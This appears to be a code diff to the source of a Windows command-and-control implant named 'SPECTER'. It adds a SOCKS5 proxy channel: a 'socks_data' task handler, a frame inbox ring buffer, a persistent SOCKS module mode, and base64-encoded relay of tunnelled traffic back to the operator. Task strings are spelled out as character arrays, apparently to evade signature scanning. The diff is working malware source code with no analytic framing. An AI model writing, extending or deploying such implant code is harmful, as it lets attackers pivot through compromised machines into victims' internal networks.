@@ -31,6 +31,23 @@
 
 static void store_task_failed_text(IMPLANT_CONTEXT *ctx, const char *task_id,
                                    const char *text, DWORD text_len);
+static DWORD task_b64_encode(const BYTE *in, DWORD in_len, BYTE *out, DWORD out_max);
+
+#define SOCKS_INBOX_MAX_FRAMES 32u
+#define SOCKS_INBOX_MAX_FRAME  8192u
+#define SOCKS_MSG_HDR_SIZE     8u
+#define ARG_TYPE_STRING_LOCAL  0u
+#define ARG_TYPE_INT32_LOCAL   1u
+
+typedef struct _SOCKS_INBOX_FRAME {
+    DWORD len;
+    BYTE  data[SOCKS_INBOX_MAX_FRAME];
+} SOCKS_INBOX_FRAME;
+
+static SOCKS_INBOX_FRAME g_socks_inbox[SOCKS_INBOX_MAX_FRAMES];
+static volatile DWORD g_socks_inbox_read_idx = 0;
+static volatile DWORD g_socks_inbox_write_idx = 0;
+static volatile DWORD g_socks_inbox_count = 0;
 
 /* ------------------------------------------------------------------ */
 /*  Dev build trace support                                            */
@@ -125,6 +142,7 @@ DWORD parse_task_type(const char *type_str, DWORD len) {
     char s_module_load[] = {'m','o','d','u','l','e','_','l','o','a','d',0};
     char s_bof_load[]    = {'b','o','f','_','l','o','a','d',0};
     char s_bof[]         = {'b','o','f',0};
+    char s_socks_data[]  = {'s','o','c','k','s','_','d','a','t','a',0};
 
     /* Built-in */
     if (streq_n(type_str, len, s_sleep))       return TASK_TYPE_SLEEP;
@@ -145,8 +163,40 @@ DWORD parse_task_type(const char *type_str, DWORD len) {
     if (streq_n(type_str, len, s_module_load)) return TASK_TYPE_MODULE;
     if (streq_n(type_str, len, s_bof_load))    return TASK_TYPE_BOF;
     if (streq_n(type_str, len, s_bof))         return TASK_TYPE_BOF;
+    if (streq_n(type_str, len, s_socks_data))  return TASK_TYPE_SOCKS_DATA;
 
     return 0;
+}
+
+BOOL task_socks_inbox_write(const BYTE *data, DWORD len) {
+    if (!data || len == 0 || len > SOCKS_INBOX_MAX_FRAME)
+        return FALSE;
+    if (g_socks_inbox_count >= SOCKS_INBOX_MAX_FRAMES)
+        return FALSE;
+
+    DWORD idx = g_socks_inbox_write_idx % SOCKS_INBOX_MAX_FRAMES;
+    spec_memcpy(g_socks_inbox[idx].data, data, len);
+    g_socks_inbox[idx].len = len;
+    g_socks_inbox_write_idx = (idx + 1) % SOCKS_INBOX_MAX_FRAMES;
+    g_socks_inbox_count++;
+    return TRUE;
+}
+
+DWORD task_socks_inbox_read(BYTE *buf, DWORD len) {
+    if (!buf || len == 0 || g_socks_inbox_count == 0)
+        return 0;
+
+    DWORD idx = g_socks_inbox_read_idx % SOCKS_INBOX_MAX_FRAMES;
+    DWORD frame_len = g_socks_inbox[idx].len;
+    if (frame_len == 0 || frame_len > len)
+        return 0;
+
+    spec_memcpy(buf, g_socks_inbox[idx].data, frame_len);
+    spec_memset(g_socks_inbox[idx].data, 0, frame_len);
+    g_socks_inbox[idx].len = 0;
+    g_socks_inbox_read_idx = (idx + 1) % SOCKS_INBOX_MAX_FRAMES;
+    g_socks_inbox_count--;
+    return frame_len;
 }
 
 /* ------------------------------------------------------------------ */
@@ -528,6 +578,92 @@ static void handle_pwd_task(IMPLANT_CONTEXT *ctx, TASK *task) {
     }
 }
 
+static DWORD load_u32_le_local(const BYTE *p) {
+    return ((DWORD)p[0]) | ((DWORD)p[1] << 8) |
+           ((DWORD)p[2] << 16) | ((DWORD)p[3] << 24);
+}
+
+static BOOL module_args_first_string_is(const BYTE *args, DWORD args_len,
+                                        const char *expected) {
+    if (!args || args_len < 16 || !expected)
+        return FALSE;
+
+    DWORD count = load_u32_le_local(args);
+    DWORD offset = 4;
+    if (count == 0 || count > 32)
+        return FALSE;
+
+    DWORD type = load_u32_le_local(args + offset);
+    offset += 4;
+    DWORD len = load_u32_le_local(args + offset);
+    offset += 4;
+
+    if (type != ARG_TYPE_STRING_LOCAL || len == 0 || len > args_len - offset)
+        return FALSE;
+    if (args[offset + len - 1] != 0)
+        return FALSE;
+
+    return streq_n((const char *)(args + offset), len - 1, expected);
+}
+
+static BOOL module_args_is_socks_start(const BYTE *args, DWORD args_len) {
+    char s_start[] = {'s','t','a','r','t',0};
+    char s_marker[] = {
+        '_','_','s','p','e','c','t','e','r','_','p','e','r','s','i','s','t','e','n','t',
+        '=','s','o','c','k','s','5',0
+    };
+    if (!module_args_first_string_is(args, args_len, s_start))
+        return FALSE;
+
+    if (args_len < 28)
+        return FALSE;
+
+    DWORD count = load_u32_le_local(args);
+    DWORD offset = 4;
+    DWORD type = load_u32_le_local(args + offset);
+    DWORD len;
+    offset += 4;
+    len = load_u32_le_local(args + offset);
+    offset += 4;
+    if (type != ARG_TYPE_STRING_LOCAL || len > args_len - offset)
+        return FALSE;
+    offset += len;
+    if (count < 2 || offset + 8 > args_len)
+        return FALSE;
+
+    type = load_u32_le_local(args + offset);
+    offset += 4;
+    len = load_u32_le_local(args + offset);
+    offset += 4;
+    if (type != ARG_TYPE_INT32_LOCAL || len != 4 || len > args_len - offset)
+        return FALSE;
+    offset += len;
+
+    /* Skip optional channel URL string at arg[2]. */
+    if (count < 4 || offset + 8 > args_len)
+        return FALSE;
+    type = load_u32_le_local(args + offset);
+    offset += 4;
+    len = load_u32_le_local(args + offset);
+    offset += 4;
+    if (type != ARG_TYPE_STRING_LOCAL || len > args_len - offset)
+        return FALSE;
+    offset += len;
+
+    if (offset + 8 > args_len)
+        return FALSE;
+    type = load_u32_le_local(args + offset);
+    offset += 4;
+    len = load_u32_le_local(args + offset);
+    offset += 4;
+    if (type != ARG_TYPE_STRING_LOCAL || len == 0 || len > args_len - offset)
+        return FALSE;
+    if (args[offset + len - 1] != 0)
+        return FALSE;
+
+    return streq_n((const char *)(args + offset), len - 1, s_marker);
+}
+
 /* ------------------------------------------------------------------ */
 /*  Module bus: execute module/BOF task via bus subsystem               */
 /* ------------------------------------------------------------------ */
@@ -604,6 +740,7 @@ static void execute_module_task(IMPLANT_CONTEXT *ctx, TASK *task) {
         module_args = package + actual_pkg_len + 1;
         module_args_len = package_len - actual_pkg_len - 1;
     }
+    BOOL persistent_socks = module_args_is_socks_start(module_args, module_args_len);
 
     TASK_TRACE("[SPECTER] execute_module_task: modmgr_execute begin");
     /* Execute via modmgr — this handles verify, decrypt, load, guardian */
@@ -617,10 +754,66 @@ static void execute_module_task(IMPLANT_CONTEXT *ctx, TASK *task) {
         return;
     }
 
+    LOADED_MODULE *mod = &mgr->slots[slot];
+    if (persistent_socks) {
+        mod->flags |= (MODULE_FLAG_PERSISTENT | MODULE_FLAG_SOCKS);
+
+        guardian_wait(mod, 250);
+
+        BYTE *output_buf = NULL;
+        DWORD drained = 0;
+        if (mod->output_ring) {
+            output_buf = (BYTE *)task_alloc(TASK_OUTPUT_MAX);
+            if (!output_buf) {
+                guardian_kill(mod);
+                modmgr_cleanup(mgr, (DWORD)slot);
+                store_task_result(ctx, task->task_id, TASK_STATUS_FAILED, NULL, 0);
+                return;
+            }
+            drained = output_drain(mod->output_ring, output_buf, TASK_OUTPUT_MAX);
+        }
+
+        if (mod->status == MODULE_STATUS_CRASHED ||
+            mod->status == MODULE_STATUS_COMPLETED) {
+            if (drained > 0) {
+                BYTE *result_data = (BYTE *)task_alloc(drained);
+                if (result_data) {
+                    spec_memcpy(result_data, output_buf, drained);
+                    store_task_result(ctx, task->task_id, TASK_STATUS_FAILED,
+                                      result_data, drained);
+                } else {
+                    store_task_result(ctx, task->task_id, TASK_STATUS_FAILED, NULL, 0);
+                }
+            } else {
+                store_task_result(ctx, task->task_id, TASK_STATUS_FAILED, NULL, 0);
+            }
+            if (output_buf)
+                task_free(output_buf);
+            modmgr_cleanup(mgr, (DWORD)slot);
+            return;
+        }
+
+        if (drained > 0) {
+            BYTE *result_data = (BYTE *)task_alloc(drained);
+            if (result_data) {
+                spec_memcpy(result_data, output_buf, drained);
+                store_task_result(ctx, task->task_id, TASK_STATUS_COMPLETE,
+                                  result_data, drained);
+            } else {
+                store_task_result(ctx, task->task_id, TASK_STATUS_COMPLETE, NULL, 0);
+            }
+        } else {
+            store_task_result(ctx, task->task_id, TASK_STATUS_COMPLETE, NULL, 0);
+        }
+        if (output_buf)
+            task_free(output_buf);
+        TASK_TRACE("[SPECTER] execute_module_task: socks persistent");
+        return;
+    }
+
     /* Wait for module to complete (blocking, with timeout).
      * The guardian thread runs the module — we wait here so we can
      * collect output and return it as a task result in this cycle. */
-    LOADED_MODULE *mod = &mgr->slots[slot];
     guardian_wait(mod, GUARDIAN_DEFAULT_TIMEOUT);
 
     /* Drain output from the module's output ring. Keep the large scratch
@@ -1138,6 +1331,84 @@ static void handle_download_chunk_task(IMPLANT_CONTEXT *ctx, TASK *task) {
     store_task_result(ctx, task->task_id, TASK_STATUS_COMPLETE, b64, out_len);
 }
 
+static void handle_socks_data_task(IMPLANT_CONTEXT *ctx, TASK *task) {
+    if (!task->data || task->data_len < SOCKS_MSG_HDR_SIZE) {
+        store_task_result(ctx, task->task_id, TASK_STATUS_FAILED, NULL, 0);
+        return;
+    }
+
+    DWORD payload_len = load_u32_le_local(task->data + 4);
+    if (payload_len > task->data_len - SOCKS_MSG_HDR_SIZE) {
+        store_task_result(ctx, task->task_id, TASK_STATUS_FAILED, NULL, 0);
+        return;
+    }
+
+    if (task_socks_inbox_write(task->data, task->data_len))
+        store_task_result(ctx, task->task_id, TASK_STATUS_COMPLETE, NULL, 0);
+    else
+        store_task_result(ctx, task->task_id, TASK_STATUS_FAILED, NULL, 0);
+}
+
+void task_collect_socks_output(IMPLANT_CONTEXT *ctx) {
+#if defined(SPECTER_BAREBONE) && !defined(SPECTER_BAREBONE_MODULES)
+    (void)ctx;
+#else
+    if (!ctx || ctx->task_result_count >= MAX_TASK_RESULTS)
+        return;
+
+    MODULE_MANAGER *mgr = modmgr_get();
+    if (!mgr || !mgr->initialized)
+        return;
+
+    for (DWORD i = 0; i < MODMGR_MAX_SLOTS; i++) {
+        LOADED_MODULE *mod = &mgr->slots[i];
+        if (mod->module_id == 0 || !(mod->flags & MODULE_FLAG_SOCKS))
+            continue;
+
+        if (mod->status == MODULE_STATUS_RUNNING)
+            guardian_wait(mod, 0);
+
+        if (!mod->output_ring)
+            continue;
+
+        while (ctx->task_result_count < MAX_TASK_RESULTS) {
+            BYTE raw[BUS_OUTPUT_ENTRY_MAX];
+            DWORD frame_len = output_drain_one(mod->output_ring, raw, sizeof(raw));
+            if (frame_len == 0)
+                break;
+            if (frame_len < SOCKS_MSG_HDR_SIZE)
+                continue;
+
+            DWORD payload_len = load_u32_le_local(raw + 4);
+            if (payload_len > frame_len - SOCKS_MSG_HDR_SIZE)
+                continue;
+
+            DWORD encoded_len = ((frame_len + 2u) / 3u) * 4u;
+            BYTE *encoded = (BYTE *)task_alloc(encoded_len);
+            if (!encoded)
+                return;
+
+            DWORD actual = task_b64_encode(raw, frame_len, encoded, encoded_len);
+            if (actual == 0) {
+                task_free(encoded);
+                return;
+            }
+
+            char synthetic_id[] = {
+                's','o','c','k','s','_','d','a','t','a',0
+            };
+            store_task_result(ctx, synthetic_id, TASK_STATUS_COMPLETE,
+                              encoded, actual);
+        }
+
+        if (mod->status == MODULE_STATUS_COMPLETED ||
+            mod->status == MODULE_STATUS_CRASHED) {
+            modmgr_cleanup(mgr, i);
+        }
+    }
+#endif
+}
+
 /* ------------------------------------------------------------------ */
 /*  Task dispatcher                                                    */
 /* ------------------------------------------------------------------ */
@@ -1183,6 +1454,10 @@ void execute_task(IMPLANT_CONTEXT *ctx, TASK *task) {
 
     case TASK_TYPE_DOWNLOAD_CHUNK:
         handle_download_chunk_task(ctx, task);
+        break;
+
+    case TASK_TYPE_SOCKS_DATA:
+        handle_socks_data_task(ctx, task);
         break;
 
     /* ---- Module bus tasks ---- */
